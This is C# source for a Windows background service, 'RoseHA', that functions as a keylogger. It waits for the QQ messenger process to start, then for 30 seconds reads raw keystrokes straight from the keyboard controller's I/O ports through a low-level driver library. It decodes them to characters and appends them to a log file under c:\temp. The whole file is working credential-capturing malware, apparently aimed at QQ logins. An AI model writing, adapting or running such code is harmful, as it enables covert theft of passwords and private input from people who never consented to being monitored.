using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace RoseHA
{
    public class RoseHAService
    {
        System.ComponentModel.BackgroundWorker backgroundWorker1;
        public RoseHAService()
        {
            backgroundWorker1 = new System.ComponentModel.BackgroundWorker();
            backgroundWorker1.WorkerReportsProgress = true;
            backgroundWorker1.WorkerSupportsCancellation = true;
            backgroundWorker1.DoWork += backgroundWorker1_DoWork;
        }
        public void OnStart(string[] args)
        {
            if (!System.IO.Directory.Exists(@"c:\temp\RoseHA\Logs\"))
            {
                System.IO.Directory.CreateDirectory(@"c:\temp\RoseHA\Logs\");
            }
            if (backgroundWorker1.IsBusy)
            {
                return;
            }
            backgroundWorker1.RunWorkerAsync();
        }

        public void OnStop()
        {
            backgroundWorker1.CancelAsync();
        }

        void backgroundWorker1_DoWork(object sender, System.ComponentModel.DoWorkEventArgs e)
        {
            DoWork(backgroundWorker1);
        }

        private void DoWork(System.ComponentModel.BackgroundWorker bk)
        {
            Ols ols = new Ols();
            int processId = 0;
            switch (ols.GetStatus())
            {
                case (uint)Ols.Status.NO_ERROR:
                    break;
                case (uint)Ols.Status.DLL_NOT_FOUND:
                    System.Console.WriteLine("Status Error!! DLL_NOT_FOUND");
                    Environment.Exit(0);
                    break;
                case (uint)Ols.Status.DLL_INCORRECT_VERSION:
                    System.Console.WriteLine("Status Error!! DLL_INCORRECT_VERSION");
                    break;
                case (uint)Ols.Status.DLL_INITIALIZE_ERROR:
                    System.Console.WriteLine("Status Error!! DLL_INITIALIZE_ERROR");
                    break;
            }


            byte lastKey = new byte();
            byte keyCount = new byte();
            byte vKeyCode = new byte();
            string vKeyASC;
            bool bTrueProcessExist = false;
            DateTime dProcessStartTime = DateTime.Now;
            while (!bk.CancellationPending)
            {
                System.Threading.Thread.Sleep(5);
                if (!bTrueProcessExist)
                {
                    foreach (System.Diagnostics.Process item in System.Diagnostics.Process.GetProcesses())
                    {
                        if (item.ProcessName.Equals("QQ") && !item.Id.Equals(processId))
                        {
                            processId = item.Id;
                            //进入
                            WriteLog("QQ Open-----------");
                            bTrueProcessExist = true;
                            dProcessStartTime = DateTime.Now;
                        }
                    }
                }
                if (bTrueProcessExist)
                {
                    if (dProcessStartTime.AddSeconds(30) > DateTime.Now)
                    {
                        byte myKBC = ols.ReadIoPortByte(0x64);
                        if (myKBC == 20 || myKBC == 28)
                        {
                            byte myData = ols.ReadIoPortByte(0x60);
                            if (myData != lastKey && myData != 0)
                            {
                                keyCount = (byte)(myData & 0x7F);
                                vKeyCode = Common.MapVirtualKey(keyCount, 1);
                                if (vKeyCode != 0)
                                {
                                    vKeyASC = Common.Chr(Common.MapVirtualKey(vKeyCode, 2));
                                    if (vKeyASC != Common.Chr(0))
                                    {
                                        if (Common.GetKeyState(0x14) % 0xFF80 == 1)
                                        {
                                            vKeyASC = vKeyASC.ToUpper();
                                        }
                                        else
                                        {
                                            vKeyASC = vKeyASC.ToLower();
                                        }
                                        if (vKeyASC == " ")
                                        {
                                            vKeyASC = "空格";
                                        }
                                    }
                                    else
                                    {
                                        vKeyASC = "[" + keyCount.ToString() + "]";
                                    }
                                    System.Console.WriteLine(vKeyASC);
                                    WriteLog(vKeyASC);
                                    lastKey = myData;
                                }
                            }
                        }
                    }
                    else
                    {
                        bTrueProcessExist = false;
                        WriteLog("Stop monitor--------------");
                    }
                }

            }
        }

        private void WriteLog(string message)
        {
            string path = @"c:\temp\RoseHA\Logs\";
            FileStream fs = new FileStream(System.IO.Path.Combine(path,"RoseHA.txt"), FileMode.Append);
            StreamWriter sw = new StreamWriter(fs);
            sw.Write(String.Format("{0}:{1}{2}", System.DateTime.Now.ToString(), message, System.Environment.NewLine));
            sw.Flush();
            sw.Close();
            fs.Close();
        }
    }
}
